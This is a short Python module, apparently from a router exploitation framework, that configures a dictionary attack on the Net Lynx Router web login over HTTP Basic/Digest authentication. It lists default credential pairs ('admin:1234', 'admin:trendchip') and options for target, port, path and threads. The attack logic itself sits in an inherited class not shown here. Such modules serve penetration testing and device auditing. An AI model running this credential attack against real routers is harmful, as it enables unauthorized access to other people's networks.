...
class Exploit(HTTPBasicDigestDefault):
    __info__ = {
        "name": "Net Lynx Router Default Web Interface Creds",
        "description": "Dictionary attack against Net Lynx Router Web Interface (HTTP Basic/Digest Auth).",
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": ("Net Lynx Router",),
    }
    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(80, "Target HTTP port")
    path = OptString("/", "Target path")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("admin:1234,admin:trendchip", "User:Pass or file with default credentials (file://)")
